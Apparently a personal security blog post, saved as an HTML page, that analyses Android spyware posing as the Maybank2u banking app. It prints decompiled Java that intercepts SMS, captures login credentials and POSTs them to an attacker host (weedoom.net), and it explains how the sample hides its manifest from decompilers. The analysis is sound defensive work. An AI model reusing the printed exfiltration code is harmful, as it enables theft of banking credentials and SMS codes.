<!DOCTYPE html>
<html lang="en" dir="auto">

<head><meta charset="utf-8">
<meta http-equiv="X-UA-Compatible" content="IE=edge">
<meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
<meta name="robots" content="index, follow">
<title>Android Spyware Maybank2u APK | KS Blog</title>
<meta name="keywords" content="malicious APK, Android">
<meta name="description" content="Description

I asked this APK from Fareed after I saw his post in X and decided to have a look into it.
Analyzing APK
This is interesting because this is my first time playing around malicious APK and I have no idea if it would affect anything on both my devices and my machine. As usual, I started out with static analysis first.
Static Analysis
I started out with both jadx and apktool but it has some error which fail to decompile the APK.">
<meta name="author" content="">
<link rel="canonical" href="https://callmeks.github.io/posts/android-spyware-maybank2u-apk/">
<link crossorigin="anonymous" href="/assets/css/stylesheet.a482bf00fa5c046040ef7973ad5fdf5657890cacb596c93f1382f664ca542074.css" integrity="sha256-pIK/APpcBGBA73lzrV/fVleJDKy1lsk/E4L2ZMpUIHQ=" rel="preload stylesheet" as="style">
<link rel="icon" href="https://en.gravatar.com/avatar/9f3c6bb94301eda83e6a03211b184f6b">
<link rel="icon" type="image/png" sizes="16x16" href="https://en.gravatar.com/avatar/9f3c6bb94301eda83e6a03211b184f6b?size=16">
<link rel="icon" type="image/png" sizes="32x32" href="https://en.gravatar.com/avatar/9f3c6bb94301eda83e6a03211b184f6b?size=32">
<link rel="apple-touch-icon" href="https://en.gravatar.com/avatar/9f3c6bb94301eda83e6a03211b184f6b">
<link rel="mask-icon" href="https://en.gravatar.com/avatar/9f3c6bb94301eda83e6a03211b184f6b">
<meta name="theme-color" content="#2e2e33">
<meta name="msapplication-TileColor" content="#2e2e33">
<link rel="alternate" hreflang="en" href="https://callmeks.github.io/posts/android-spyware-maybank2u-apk/">
<noscript>
    <style>
        #theme-toggle,
        .top-link {
            display: none;
        }

    </style>
    <style>
        @media (prefers-color-scheme: dark) {
            :root {
                --theme: rgb(29, 30, 32);
                --entry: rgb(46, 46, 51);
                --primary: rgb(218, 218, 219);
                --secondary: rgb(155, 156, 157);
                --tertiary: rgb(65, 66, 68);
                --content: rgb(196, 196, 197);
                --code-block-bg: rgb(46, 46, 51);
                --code-bg: rgb(55, 56, 62);
                --border: rgb(51, 51, 51);
            }

            .list {
                background: var(--theme);
            }

            .list:not(.dark)::-webkit-scrollbar-track {
                background: 0 0;
            }

            .list:not(.dark)::-webkit-scrollbar-thumb {
                border-color: var(--theme);
            }
        }

    </style>
</noscript><meta property="og:url" content="https://callmeks.github.io/posts/android-spyware-maybank2u-apk/">
  <meta property="og:site_name" content="KS Blog">
  <meta property="og:title" content="Android Spyware Maybank2u APK">
  <meta property="og:description" content="Description I asked this APK from Fareed after I saw his post in X and decided to have a look into it.
Analyzing APK This is interesting because this is my first time playing around malicious APK and I have no idea if it would affect anything on both my devices and my machine. As usual, I started out with static analysis first.
Static Analysis I started out with both jadx and apktool but it has some error which fail to decompile the APK.">
  <meta property="og:locale" content="en-us">
  <meta property="og:type" content="article">
    <meta property="article:section" content="posts">
    <meta property="article:published_time" content="2025-05-04T14:56:10+08:00">
    <meta property="article:modified_time" content="2025-05-04T14:56:10+08:00">
    <meta property="article:tag" content="Malicious APK">
    <meta property="article:tag" content="Android">
<meta name="twitter:card" content="summary">
<meta name="twitter:title" content="Android Spyware Maybank2u APK">
<meta name="twitter:description" content="Description

I asked this APK from Fareed after I saw his post in X and decided to have a look into it.
Analyzing APK
This is interesting because this is my first time playing around malicious APK and I have no idea if it would affect anything on both my devices and my machine. As usual, I started out with static analysis first.
Static Analysis
I started out with both jadx and apktool but it has some error which fail to decompile the APK.">


<script type="application/ld+json">
{
  "@context": "https://schema.org",
  "@type": "BreadcrumbList",
  "itemListElement": [
    {
      "@type": "ListItem",
      "position":  1 ,
      "name": "Posts",
      "item": "https://callmeks.github.io/posts/"
    }, 
    {
      "@type": "ListItem",
      "position":  2 ,
      "name": "Android Spyware Maybank2u APK",
      "item": "https://callmeks.github.io/posts/android-spyware-maybank2u-apk/"
    }
  ]
}
</script>
<script type="application/ld+json">
{
  "@context": "https://schema.org",
  "@type": "BlogPosting",
  "headline": "Android Spyware Maybank2u APK",
  "name": "Android Spyware Maybank2u APK",
  "description": "Description I asked this APK from Fareed after I saw his post in X and decided to have a look into it.\nAnalyzing APK This is interesting because this is my first time playing around malicious APK and I have no idea if it would affect anything on both my devices and my machine. As usual, I started out with static analysis first.\nStatic Analysis I started out with both jadx and apktool but it has some error which fail to decompile the APK.\n",
  "keywords": [
    "malicious APK", "Android"
  ],
  "articleBody": "Description I asked this APK from Fareed after I saw his post in X and decided to have a look into it.\nAnalyzing APK This is interesting because this is my first time playing around malicious APK and I have no idea if it would affect anything on both my devices and my machine. As usual, I started out with static analysis first.\nStatic Analysis I started out with both jadx and apktool but it has some error which fail to decompile the APK.\n1 2 3 4 5 6 7 jadx .\\Maybank2u.apk INFO - loading ... ERROR - Failed to process zip file: .\\Maybank2u.apk jadx.core.utils.exceptions.JadxRuntimeException: Failed to process zip file: .\\Maybank2u.apk ...[snip]... Caused by: java.util.zip.ZipException: invalid CEN header (encrypted entry) ...[snip]... 1 2 3 4 5 6 7 apktool d .\\Maybank2u.apk I: Using Apktool 2.10.0 on Maybank2u.apk with 8 thread(s). Exception in thread \"main\" brut.androlib.exceptions.AndrolibException: brut.directory.DirectoryException: java.util.zip.ZipException: invalid CEN header (encrypted entry) ...[snip]... Caused by: brut.directory.DirectoryException: java.util.zip.ZipException: invalid CEN header (encrypted entry) ...[snip]... Caused by: java.util.zip.ZipException: invalid CEN header (encrypted entry) Based on both the error, I somehow could not decompile it due to this invalid CEN header. After poking around, I found out something interesting.\n1 2 3 4 5 6 unzip Maybank2u.apk Archive: Maybank2u.apk [Maybank2u.apk] AndroidManifest.xml password: skipping: AndroidManifest.xml incorrect password inflating: classes.dex ...[snip]... Somehow, the AndroidManifest.xml is password protected while the remaining files can be unzipped. AndroidManifest.xml is something important as it contains a lot of information. Although I could not get the AndroidManifest.xml, I still have chances to understand the application as classes.dex is extracted from the zip file. It is possible to open classes.dex in jadx-gui without any error. The only downside is I will have to understand the code without AndroidManifest.xml.\n1 2 3 4 5 if (getSharedPreferences(\"app_data_launch_f\", 0).getBoolean(\"isFirstRun\", true)) { AlertDialog.Builder builder = new AlertDialog.Builder(this); String locale = Locale.getDefault().toString(); int hashCode3 = locale.hashCode(); String str2 = \"Ruxsatlar talab qilinadi\"; Based on what I understand from the code, this is checking if the isFirstRun value is true or not in shared preferences. If the condition is met, it will request permission for the application and allow the application to work as intended. Something interesting is it uses Ruxsatlar talab qilinadi which is Uzbek and Разрешить which is Russian words aside from English.\n1 N8.a(this, new O8(-425911099, new Bn(this, i), true)); If I did not meet the condition mentioned above, the application will instead start this a function which seems like some other kind of interface.\n1 startService(new Intent(this, (Class\u003c?\u003e) MgRKn55kcebb482e4b514772964e31012d0b1157.class)); One more things that I noticed is on the end of the onCreate function, there’s this startService function which send intent to the class.\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 public final class MgRKn55kcebb482e4b514772964e31012d0b1157 extends Service { public RE Tj0TVE0Hb5c3ac3785e6455cb344fca21faf691b; public final IBinder GZhJfnKSd3bcf0449614b4f9f971198a1927183cd(Intent intent) { return null; } public final int L3SIZ9rLe3f0e2e3fd01496286efcad0fda547f6(Intent intent, int i, int i2) { this.Tj0TVE0Hb5c3ac3785e6455cb344fca21faf691b = new RE(); IntentFilter intentFilter = new IntentFilter(); intentFilter.setPriority(1000); intentFilter.addAction(\"android.provider.Telephony.SMS_RECEIVED\"); RE re = this.Tj0TVE0Hb5c3ac3785e6455cb344fca21faf691b; if (re != null) { registerReceiver(re, intentFilter); return 2; } AbstractC0641jk.U(\"receiver\"); throw null; } @Override // android.app.Service public final void onDestroy() { RE re = this.Tj0TVE0Hb5c3ac3785e6455cb344fca21faf691b; if (re == null) { AbstractC0641jk.U(\"receiver\"); throw null; } unregisterReceiver(re); super.onDestroy(); } } This class looks like a service that will trigger the broadcast receiver onReceive function to receive SMS messages. Aside from that, I really have no idea at the moment and decided to perform dynamic analysis\nDynamic Analysis I started out by installing the malicious APK into my emulator.\nI then start to play around with the application.\nIt does requesting permission, let see what permission it is asking.\nIt is requesting permission for contact, phone calls, SMS and running in background. These permissions are dangerous and should not be allowed especially when the APK is suspicious. But since I am performing analysis, I will need to provide these permissions in order to understand the application.\nLooking into the first page, It is a login page which asked for username and password. I then tried to have a look at the code which have the keywords of username, password, login.\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 public final Object c() { MainActivity mainActivity; Uo uo = this.g; if (!((Boolean) uo.getValue()).booleanValue()) { Uo uo2 = this.h; int length = ((String) uo2.getValue()).length(); Uo uo3 = this.i; if (length \u003c 6) { uo3.setValue(\"Input Username between 6 and 16 characters.\"); } else { Uo uo4 = this.j; if (((String) uo4.getValue()).length() \u003c 6) { uo3.setValue(\"Invalid username/password.\"); } I found one that looks interesting which it checks if the input and will provide some feedback if the input is 6 or lower.\nLook’s like the code is for username and password length. If both of the input meet the requirement of 7 characters and above, it will perform something which has very long code.\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 public static String b(String str) { int i; int i2; int i3; AbstractC0641jk.v(str, \"input\"); byte[] bytes = str.getBytes(AbstractC0755m7.a); AbstractC0641jk.u(bytes, \"this as java.lang.String).getBytes(charset)\"); String encodeToString = Base64.encodeToString(bytes, 2); AbstractC0641jk.s(encodeToString); StringBuilder sb = new StringBuilder(); int length = encodeToString.length(); for (int i4 = 0; i4 \u003c length; i4++) { char charAt = encodeToString.charAt(i4); if (Character.isLowerCase(charAt)) { i2 = 97; if ('a' \u003c= charAt \u0026\u0026 charAt \u003c '{') { i3 = (charAt - 'Y') % 26; i = i3 + i2; charAt = (char) i; sb.append(charAt); } } if (!Character.isLowerCase(charAt) || 1072 \u003e charAt || charAt \u003e= 1104) { if (Character.isUpperCase(charAt)) { i2 = 65; if ('A' \u003c= charAt \u0026\u0026 charAt \u003c '[') { i3 = (charAt - '9') % 26; i = i3 + i2; } } if (Character.isUpperCase(charAt)) { i2 = 1040; if (1040 \u003c= charAt \u0026\u0026 charAt \u003c 1072) { i3 = (charAt - 1032) % 32; i = i3 + i2; } } if (Character.isDigit(charAt)) { i = ((charAt - '(') % 10) + 48; } else { sb.append(charAt); } } else { i = ((charAt - 1064) % 32) + 1072; } charAt = (char) i; sb.append(charAt); } String sb2 = sb.toString(); AbstractC0641jk.u(sb2, \"toString(...)\"); return sb2; } I noticed that this function will be triggered after some information is collected. This function looks like base64 encode the strings and character permutation.\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 public void d(JSONObject jSONObject, boolean z) { String concat; Xp xp = new Xp(); if (z) { byte[] decode = Base64.decode(\"aHR0cHM6Ly93ZWVkb29tLm5ldA==\", 0); AbstractC0641jk.s(decode); concat = new String(decode, AbstractC0755m7.a).concat(\"/minit\"); } else { byte[] decode2 = Base64.decode(\"aHR0cHM6Ly93ZWVkb29tLm5ldA==\", 0); AbstractC0641jk.s(decode2); concat = new String(decode2, AbstractC0755m7.a).concat(\"/multipush\"); } try { Gl gl = new Gl(); gl.m(concat); Pattern pattern = Vn.c; Vn z2 = AbstractC0597ik.z(\"application/json; charset=utf-8\"); String jSONObject2 = jSONObject.toString(); AbstractC0641jk.u(jSONObject2, \"toString(...)\"); gl.l(\"POST\", AbstractC0597ik.s(z2, jSONObject2)); byte[] decode3 = Base64.decode(\"QmV0YQ==\", 0); AbstractC0641jk.s(decode3); String b = b(new String(decode3, AbstractC0755m7.a)); C0236ai c0236ai = (C0236ai) gl.c; c0236ai.getClass(); AbstractC0737lq.o(\"auth\"); AbstractC0737lq.t(b, \"auth\"); c0236ai.a(\"auth\", b); String string = Settings.Secure.getString(this.a.getContentResolver(), \"android_id\"); AbstractC0641jk.u(string, \"getString(...)\"); String b2 = b(string); C0236ai c0236ai2 = (C0236ai) gl.c; c0236ai2.getClass(); AbstractC0737lq.o(\"id\"); AbstractC0737lq.t(b2, \"id\"); c0236ai2.a(\"id\", b2); new C0563hu(xp, gl.e()).e(new Yw(11)); } catch (Exception unused) { } } I then noticed another function is triggered. This function looks like some HTTP URL connection where it use POST method to send a JSON object. The URL is https://weedoom.net and it has 2 endpoint /minit and /multipush. Since the function input c0044Fe.d(jSONObject, true); is true, the /multipush is not likely used in this case. After understanding all, I tried to send a fake creds and see it it’s correct.\nAfter providing an input 7 or more in both usernamd and password field, I was redirected to this page. I then looked into my web proxy and see if any request is sent.\nA request was sent to https://weedoom.net/minit. I then tried to decode based on the function b and see what kind of information they have collected.\nusername and password list of application installed SMS received most likely SIM card information Looking into the screenshot, I also noticed that https://weedoom.net/multipush was triggered from somewhere else. It has something to do with the broadcast receiver where when a new SMS is received, it will send the information to https://weedoom.net/multipush.\nNew Update It is possible to decompile using the latest unstable release jadx or jadx-gui. Here’s the link to get the latest unstable release. https://nightly.link/skylot/jadx/workflows/build-artifacts/master\nI found out another easier method by using zip command.\n1 2 3 zip -FF Maybank2u.apk --out yeehar.apk Fix archive (-FF) - salvage what can Found end record (EOCDR) - says expect single disk archive After it completes, just use any version of jadx or apktool and it should now working as intended.\nThings I learned from the APK you can protect AndroidManifest.xml ??? (latest jadx is immune to this) reverse engineer a simple malicious APK ",
  "wordCount" : "1550",
  "inLanguage": "en",
  "datePublished": "2025-05-04T14:56:10+08:00",
  "dateModified": "2025-05-04T14:56:10+08:00",
  "mainEntityOfPage": {
    "@type": "WebPage",
    "@id": "https://callmeks.github.io/posts/android-spyware-maybank2u-apk/"
  },
  "publisher": {
    "@type": "Organization",
    "name": "KS Blog",
    "logo": {
      "@type": "ImageObject",
      "url": "https://en.gravatar.com/avatar/9f3c6bb94301eda83e6a03211b184f6b"
    }
  }
}
</script>
</head>

<body class="" id="top">
<script>
    if (localStorage.getItem("pref-theme") === "dark") {
        document.body.classList.add('dark');
    } else if (localStorage.getItem("pref-theme") === "light") {
        document.body.classList.remove('dark')
    } else if (window.matchMedia('(prefers-color-scheme: dark)').matches) {
        document.body.classList.add('dark');
    }

</script>

<header class="header">
    <nav class="nav">
        <div class="logo">
            <a href="https://callmeks.github.io/" accesskey="h" title="KS Blog (Alt + H)">KS Blog</a>
            <div class="logo-switches">
                <button id="theme-toggle" accesskey="t" title="(Alt + T)" aria-label="Toggle theme">
                    <svg id="moon" xmlns="http://www.w3.org/2000/svg" width="24" height="18" viewBox="0 0 24 24"
                        fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round"
                        stroke-linejoin="round">
                        <path d="M21 12.79A9 9 0 1 1 11.21 3 7 7 0 0 0 21 12.79z"></path>
                    </svg>
                    <svg id="sun" xmlns="http://www.w3.org/2000/svg" width="24" height="18" viewBox="0 0 24 24"
                        fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round"
                        stroke-linejoin="round">
                        <circle cx="12" cy="12" r="5"></circle>
                        <line x1="12" y1="1" x2="12" y2="3"></line>
                        <line x1="12" y1="21" x2="12" y2="23"></line>
                        <line x1="4.22" y1="4.22" x2="5.64" y2="5.64"></line>
                        <line x1="18.36" y1="18.36" x2="19.78" y2="19.78"></line>
                        <line x1="1" y1="12" x2="3" y2="12"></line>
                        <line x1="21" y1="12" x2="23" y2="12"></line>
                        <line x1="4.22" y1="19.78" x2="5.64" y2="18.36"></line>
                        <line x1="18.36" y1="5.64" x2="19.78" y2="4.22"></line>
                    </svg>
                </button>
            </div>
        </div>
        <ul id="menu">
            <li>
                <a href="https://callmeks.github.io/search/" title="Search (Alt &#43; /)" accesskey=/>
                    <span>Search</span>
                </a>
            </li>
            <li>
                <a href="https://callmeks.github.io/posts/" title="Posts">
                    <span>Posts</span>
                </a>
            </li>
            <li>
                <a href="https://callmeks.github.io/tags/" title="Tags">
                    <span>Tags</span>
                </a>
            </li>
            <li>
                <a href="https://callmeks.github.io/archives/" title="Archives">
                    <span>Archives</span>
                </a>
            </li>
            <li>
                <a href="https://callmeks.github.io/about/" title="Whoami">
                    <span>Whoami</span>
                </a>
            </li>
        </ul>
    </nav>
</header>
<main class="main">

<article class="post-single">
  <header class="post-header">
    <div class="breadcrumbs"><a href="https://callmeks.github.io/">Home</a>&nbsp;»&nbsp;<a href="https://callmeks.github.io/posts/">Posts</a></div>
    <h1 class="post-title entry-hint-parent">
      Android Spyware Maybank2u APK
    </h1>
    <div class="post-meta"><span title='2025-05-04 14:56:10 +0800 +08'>May 4, 2025</span>&nbsp;·&nbsp;<span>8 min</span>&nbsp;·&nbsp;<span>1550 words</span>

</div>
  </header> <div class="toc">
    <details >
        <summary accesskey="c" title="(Alt + C)">
            <span class="details">Table of Contents</span>
        </summary>

        <div class="inner"><nav id="TableOfContents">
  <ul>
    <li><a href="#description">Description</a></li>
    <li><a href="#analyzing-apk">Analyzing APK</a>
      <ul>
        <li><a href="#static-analysis">Static Analysis</a></li>
        <li><a href="#dynamic-analysis">Dynamic Analysis</a></li>
        <li><a href="#new-update">New Update</a></li>
      </ul>
    </li>
    <li><a href="#things-i-learned-from-the-apk">Things I learned from the APK</a></li>
  </ul>
</nav>
        </div>
    </details>
</div>

  <div class="post-content"><h2 id="description">Description<a hidden class="anchor" aria-hidden="true" href="#description">#</a></h2>
<blockquote>
<p>I asked this APK from Fareed after I saw his post in <a href="https://x.com/frdfzi/status/1914682801674240012">X</a> and decided to have a look into it.</p></blockquote>
<h2 id="analyzing-apk">Analyzing APK<a hidden class="anchor" aria-hidden="true" href="#analyzing-apk">#</a></h2>
<p>This is interesting because this is my first time playing around malicious APK and I have no idea if it would affect anything on both my devices and my machine. As usual, I started out with static analysis first.</p>
<h3 id="static-analysis">Static Analysis<a hidden class="anchor" aria-hidden="true" href="#static-analysis">#</a></h3>
<p>I started out with both <code>jadx</code> and <code>apktool</code> but it has some error which fail to decompile the APK.</p>
<div class="highlight"><div style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">
<table style="border-spacing:0;padding:0;margin:0;border:0;"><tr><td style="vertical-align:top;padding:0;margin:0;border:0;">
<pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f" id="hl-0-1"><a style="outline:none;text-decoration:none;color:inherit" href="#hl-0-1">1</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f" id="hl-0-2"><a style="outline:none;text-decoration:none;color:inherit" href="#hl-0-2">2</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f" id="hl-0-3"><a style="outline:none;text-decoration:none;color:inherit" href="#hl-0-3">3</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f" id="hl-0-4"><a style="outline:none;text-decoration:none;color:inherit" href="#hl-0-4">4</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f" id="hl-0-5"><a style="outline:none;text-decoration:none;color:inherit" href="#hl-0-5">5</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f" id="hl-0-6"><a style="outline:none;text-decoration:none;color:inherit" href="#hl-0-6">6</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f" id="hl-0-7"><a style="outline:none;text-decoration:none;color:inherit" href="#hl-0-7">7</a>
</span></code></pre></td>
<td style="vertical-align:top;padding:0;margin:0;border:0;;width:100%">
<pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>jadx .<span style="color:#ae81ff">\M</span>aybank2u.apk
</span></span><span style="display:flex;"><span>INFO  - loading ...
</span></span><span style="display:flex;"><span>ERROR - Failed to process zip file: .<span style="color:#ae81ff">\M</span>aybank2u.apk
</span></span><span style="display:flex;"><span>jadx.core.utils.exceptions.JadxRuntimeException: Failed to process zip file: .<span style="color:#ae81ff">\M</span>aybank2u.apk
</span></span><span style="display:flex;"><span>...<span style="color:#f92672">[</span>snip<span style="color:#f92672">]</span>...
</span></span><span style="display:flex;"><span>Caused by: java.util.zip.ZipException: invalid CEN header <span style="color:#f92672">(</span>encrypted entry<span style="color:#f92672">)</span>
</span></span><span style="display:flex;"><span>...<span style="color:#f92672">[</span>snip<span style="color:#f92672">]</span>...
</span></span></code></pre></td></tr></table>
</div>
</div><div class="highlight"><div style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">
<table style="border-spacing:0;padding:0;margin:0;border:0;"><tr><td style="vertical-align:top;padding:0;margin:0;border:0;">
<pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f" id="hl-1-1"><a style="outline:none;text-decoration:none;color:inherit" href="#hl-1-1">1</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f" id="hl-1-2"><a style="outline:none;text-decoration:none;color:inherit" href="#hl-1-2">2</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f" id="hl-1-3"><a style="outline:none;text-decoration:none;color:inherit" href="#hl-1-3">3</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f" id="hl-1-4"><a style="outline:none;text-decoration:none;color:inherit" href="#hl-1-4">4</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f" id="hl-1-5"><a style="outline:none;text-decoration:none;color:inherit" href="#hl-1-5">5</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f" id="hl-1-6"><a style="outline:none;text-decoration:none;color:inherit" href="#hl-1-6">6</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f" id="hl-1-7"><a style="outline:none;text-decoration:none;color:inherit" href="#hl-1-7">7</a>
</span></code></pre></td>
<td style="vertical-align:top;padding:0;margin:0;border:0;;width:100%">
<pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>apktool d .<span style="color:#ae81ff">\M</span>aybank2u.apk
</span></span><span style="display:flex;"><span>I: Using Apktool 2.10.0 on Maybank2u.apk with <span style="color:#ae81ff">8</span> thread<span style="color:#f92672">(</span>s<span style="color:#f92672">)</span>.
</span></span><span style="display:flex;"><span>Exception in thread <span style="color:#e6db74">&#34;main&#34;</span> brut.androlib.exceptions.AndrolibException: brut.directory.DirectoryException: java.util.zip.ZipException: invalid CEN header <span style="color:#f92672">(</span>encrypted entry<span style="color:#f92672">)</span>
</span></span><span style="display:flex;"><span>...<span style="color:#f92672">[</span>snip<span style="color:#f92672">]</span>...
</span></span><span style="display:flex;"><span>Caused by: brut.directory.DirectoryException: java.util.zip.ZipException: invalid CEN header <span style="color:#f92672">(</span>encrypted entry<span style="color:#f92672">)</span>
</span></span><span style="display:flex;"><span>...<span style="color:#f92672">[</span>snip<span style="color:#f92672">]</span>...
</span></span><span style="display:flex;"><span>Caused by: java.util.zip.ZipException: invalid CEN header <span style="color:#f92672">(</span>encrypted entry<span style="color:#f92672">)</span>
</span></span></code></pre></td></tr></table>
</div>
</div><p>Based on both the error, I somehow could not decompile it due to this <code>invalid CEN header</code>. After poking around, I found out something interesting.</p>
<div class="highlight"><div style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">
<table style="border-spacing:0;padding:0;margin:0;border:0;"><tr><td style="vertical-align:top;padding:0;margin:0;border:0;">
<pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f" id="hl-2-1"><a style="outline:none;text-decoration:none;color:inherit" href="#hl-2-1">1</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f" id="hl-2-2"><a style="outline:none;text-decoration:none;color:inherit" href="#hl-2-2">2</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f" id="hl-2-3"><a style="outline:none;text-decoration:none;color:inherit" href="#hl-2-3">3</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f" id="hl-2-4"><a style="outline:none;text-decoration:none;color:inherit" href="#hl-2-4">4</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f" id="hl-2-5"><a style="outline:none;text-decoration:none;color:inherit" href="#hl-2-5">5</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f" id="hl-2-6"><a style="outline:none;text-decoration:none;color:inherit" href="#hl-2-6">6</a>
</span></code></pre></td>
<td style="vertical-align:top;padding:0;margin:0;border:0;;width:100%">
<pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>unzip Maybank2u.apk
</span></span><span style="display:flex;"><span>Archive:  Maybank2u.apk
</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>Maybank2u.apk<span style="color:#f92672">]</span> AndroidManifest.xml password:
</span></span><span style="display:flex;"><span>   skipping: AndroidManifest.xml     incorrect password
</span></span><span style="display:flex;"><span>  inflating: classes.dex
</span></span><span style="display:flex;"><span>...<span style="color:#f92672">[</span>snip<span style="color:#f92672">]</span>...
</span></span></code></pre></td></tr></table>
</div>
</div><p>Somehow, the <code>AndroidManifest.xml</code> is password protected while the remaining files can be unzipped. <code>AndroidManifest.xml</code> is something important as it contains a lot of information. Although I could not get the <code>AndroidManifest.xml</code>, I still have chances to understand the application as <code>classes.dex</code> is extracted from the zip file. It is possible to open <code>classes.dex</code> in <code>jadx-gui</code> without any error. The only downside is I will have to understand the code without <code>AndroidManifest.xml</code>.</p>
<div class="highlight"><div style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">
<table style="border-spacing:0;padding:0;margin:0;border:0;"><tr><td style="vertical-align:top;padding:0;margin:0;border:0;">
<pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f" id="hl-3-1"><a style="outline:none;text-decoration:none;color:inherit" href="#hl-3-1">1</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f" id="hl-3-2"><a style="outline:none;text-decoration:none;color:inherit" href="#hl-3-2">2</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f" id="hl-3-3"><a style="outline:none;text-decoration:none;color:inherit" href="#hl-3-3">3</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f" id="hl-3-4"><a style="outline:none;text-decoration:none;color:inherit" href="#hl-3-4">4</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f" id="hl-3-5"><a style="outline:none;text-decoration:none;color:inherit" href="#hl-3-5">5</a>
</span></code></pre></td>
<td style="vertical-align:top;padding:0;margin:0;border:0;;width:100%">
<pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-java" data-lang="java"><span style="display:flex;"><span><span style="color:#66d9ef">if</span> (getSharedPreferences(<span style="color:#e6db74">&#34;app_data_launch_f&#34;</span>, 0).<span style="color:#a6e22e">getBoolean</span>(<span style="color:#e6db74">&#34;isFirstRun&#34;</span>, <span style="color:#66d9ef">true</span>)) {
</span></span><span style="display:flex;"><span>    AlertDialog.<span style="color:#a6e22e">Builder</span> builder <span style="color:#f92672">=</span> <span style="color:#66d9ef">new</span> AlertDialog.<span style="color:#a6e22e">Builder</span>(<span style="color:#66d9ef">this</span>);
